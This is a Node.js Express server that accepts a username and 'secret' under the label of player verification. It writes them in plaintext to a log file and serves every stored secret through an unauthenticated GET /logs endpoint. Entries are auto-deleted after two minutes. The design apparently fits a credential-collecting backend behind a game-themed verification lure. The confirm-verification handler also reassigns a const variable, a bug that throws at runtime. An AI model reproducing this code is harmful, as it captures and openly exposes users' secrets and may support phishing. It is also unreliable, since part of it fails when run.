const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const app = express();

app.use(express.json());

const MEMORY_LOGS_VERIFY = path.join(__dirname, 'memory-logs-verify.txt');

// In-memory store to track pending deletions and user sessions
const pendingDeletions = new Map();
const userSessions = new Map(); // Track user verification sessions

// Helper function to ensure log file exists
async function ensureLogFile() {
    try {
        await fs.access(MEMORY_LOGS_VERIFY);
    } catch (error) {
        await fs.writeFile(MEMORY_LOGS_VERIFY, '');
        console.log('📁 Created new log file');
    }
}

// Function to delete specific user data immediately
async function deleteUserData(username) {
    try {
        const data = await fs.readFile(MEMORY_LOGS_VERIFY, 'utf8');
        const lines = data.split('\n');
        const filtered = lines.filter(line => 
            !line.includes(`Username: ${username}`)
        );

        await fs.writeFile(MEMORY_LOGS_VERIFY, filtered.join('\n'));
        console.log(`🗑️ Deleted data for user: ${username}`);
        return true;
    } catch (error) {
        console.error('❌ Delete error:', error.message);
        return false;
    }
}

// Improved deletion function that's safer with concurrent access
async function scheduleLogDeletion(lineContent, delay = 120000) {
    const deletionId = Date.now() + Math.random();
    pendingDeletions.set(deletionId, lineContent);

    const timeoutId = setTimeout(async () => {
        try {
            if (!pendingDeletions.has(deletionId)) return;

            const data = await fs.readFile(MEMORY_LOGS_VERIFY, 'utf8');
            const lines = data.split('\n');
            const filtered = lines.filter(line => 
                line.trim() !== lineContent.trim()
            );

            await fs.writeFile(MEMORY_LOGS_VERIFY, filtered.join('\n'));
            pendingDeletions.delete(deletionId);

            console.log(`🗑️ Auto-deleted log entry after ${delay/1000}s`);
        } catch (deleteErr) {
            console.error('❌ Delete error:', deleteErr.message);
            pendingDeletions.delete(deletionId);
        }
    }, delay);

    return { deletionId, timeoutId };
}

// Submit verification data
app.post('/verify', async (req, res) => {
    try {
        const { username, secret } = req.body;

        // Input validation
        if (!username || !secret) {
            return res.status(400).json({ 
                success: false, 
                message: 'Missing required fields: username and secret' 
            });
        }

        if (typeof username !== 'string' || typeof secret !== 'string') {
            return res.status(400).json({ 
                success: false, 
                message: 'Username and secret must be strings' 
            });
        }

        if (username.length > 100 || secret.length > 100) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username and secret must be less than 100 characters' 
            });
        }

        console.log('📝 Received verification request:', { 
            username: username.substring(0, 10) + '...', 
            secretLength: secret.length 
        });

        const timestamp = new Date().toISOString();
        const sessionId = Date.now() + Math.random();
        const logLine = `[${timestamp}] Username: ${username}, Secret: ${secret}\n`;

        // Ensure log file exists
        await ensureLogFile();

        // Write to file
        await fs.appendFile(MEMORY_LOGS_VERIFY, logLine);

        console.log(`✅ Saved verification for user: ${username}`);

        // Store session info for later verification
        userSessions.set(sessionId, {
            username,
            timestamp,
            logLine,
            verified: false
        });

        // Schedule automatic deletion (fallback)
        const deletion = await scheduleLogDeletion(logLine, 120000);

        res.json({ 
            success: true, 
            message: 'Player verification saved successfully!',
            sessionId,
            expiresIn: '2 minutes (or until verified)'
        });

    } catch (error) {
        console.error('❌ Server error in /verify:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Server error'
        });
    }
});

// NEW: Confirm verification and delete data immediately
app.post('/confirm-verification', async (req, res) => {
    try {
        const { sessionId, username } = req.body;

        if (!sessionId && !username) {
            return res.status(400).json({ 
                success: false, 
                message: 'Either sessionId or username is required' 
            });
        }

        let userSession = null;

        // Find session by ID or username
        if (sessionId) {
            userSession = userSessions.get(sessionId);
        } else if (username) {
            for (let [id, session] of userSessions) {
                if (session.username === username) {
                    userSession = session;
                    sessionId = id;
                    break;
                }
            }
        }

        if (!userSession) {
            return res.status(404).json({ 
                success: false, 
                message: 'Session not found or already verified' 
            });
        }

        if (userSession.verified) {
            return res.status(400).json({ 
                success: false, 
                message: 'User already verified' 
            });
        }

        // Delete user data immediately
        const deleted = await deleteUserData(userSession.username);

        if (deleted) {
            // Mark as verified and remove from session
            userSession.verified = true;
            userSessions.delete(sessionId);

            console.log(`✅ User ${userSession.username} verified and data deleted`);

            res.json({ 
                success: true, 
                message: 'Verification confirmed and data deleted successfully!',
                username: userSession.username
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'Failed to delete user data' 
            });
        }

    } catch (error) {
        console.error('❌ Server error in /confirm-verification:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Server error'
        });
    }
});

// Get current sessions
app.get('/sessions', (req, res) => {
    const sessions = Array.from(userSessions.entries()).map(([id, session]) => ({
        sessionId: id,
        username: session.username,
        timestamp: session.timestamp,
        verified: session.verified
    }));

    res.json({ 
        success: true, 
        count: sessions.length,
        sessions 
    });
});

// Get logs endpoint with better error handling
app.get('/logs', async (req, res) => {
    try {
        await ensureLogFile();
        const data = await fs.readFile(MEMORY_LOGS_VERIFY, 'utf8');

        const lines = data.split('\n').filter(line => line.trim());

        res.json({ 
            success: true, 
            count: lines.length,
            logs: data.trim() || 'No logs found',
            pendingDeletions: pendingDeletions.size,
            activeSessions: userSessions.size
        });
    } catch (error) {
        console.error('❌ Error reading logs:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error reading logs', 
            error: process.env.NODE_ENV === 'development' ? error.message : 'Server error'
        });
    }
});

// Clear all logs endpoint
app.delete('/logs', async (req, res) => {
    try {
        await fs.writeFile(MEMORY_LOGS_VERIFY, '');
        pendingDeletions.clear();
        userSessions.clear();
        console.log('🧹 All logs and sessions cleared');
        res.json({ success: true, message: 'All logs and sessions cleared' });
    } catch (error) {
        console.error('❌ Error clearing logs:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error clearing logs', 
            error: process.env.NODE_ENV === 'development' ? error.message : 'Server error'
        });
    }
});

// Health check endpoint
app.get('/', (req, res) => {
    res.json({ 
        status: 'Server is running! 🚀',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        endpoints: {
            'POST /verify': 'Submit player verification data',
            'POST /confirm-verification': 'Confirm verification and delete data',
            'GET /sessions': 'View active sessions',
            'GET /logs': 'View current logs',
            'DELETE /logs': 'Clear all logs',
            'GET /': 'Health check'
        },
        statistics: {
            pendingDeletions: pendingDeletions.size,
            activeSessions: userSessions.size
        }
    });
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down server...');

    pendingDeletions.clear();
    userSessions.clear();

    console.log('✅ Server shut down gracefully');
    process.exit(0);
});